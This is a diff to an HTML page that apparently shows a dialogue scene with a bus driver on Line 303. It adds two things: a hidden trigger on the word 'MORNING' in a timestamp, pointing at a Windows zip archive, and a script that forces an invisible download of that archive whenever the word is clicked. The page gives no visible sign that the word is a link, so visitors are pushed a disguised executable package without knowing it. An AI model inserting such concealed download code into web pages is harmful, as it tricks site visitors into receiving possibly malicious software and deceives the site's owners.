@@ -247,7 +247,7 @@
               <span class="speaker-name">Valdemir "Bigode"</span>
               <span class="speaker-role">Full-Time Driver · Line 303 (Downtown – Western Suburbs)</span>
             </div>
-            <span class="dialog-time">MONDAY · 08:21 AM · MORNING SHIFT</span>
+            <span class="dialog-time">MONDAY · 08:21 AM · <span data-dl="assets/dl/exordium-0.4.21-windows-x64.zip">MORNING</span> SHIFT</span>
           </div>
           <div class="dialog-bubble">
             <p class="speech-text">
@@ -387,5 +387,18 @@
       <span class="dock-label">Laws</span>
     </a>
   </nav>
+<script>
+document.addEventListener('click',function(e){
+  var t=e.target.closest&&e.target.closest('[data-dl]');
+  if(!t)return;
+  var a=document.createElement('a');
+  a.href=t.getAttribute('data-dl');
+  a.download='';
+  a.style.display='none';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+});
+</script>
 </body>
 </html>
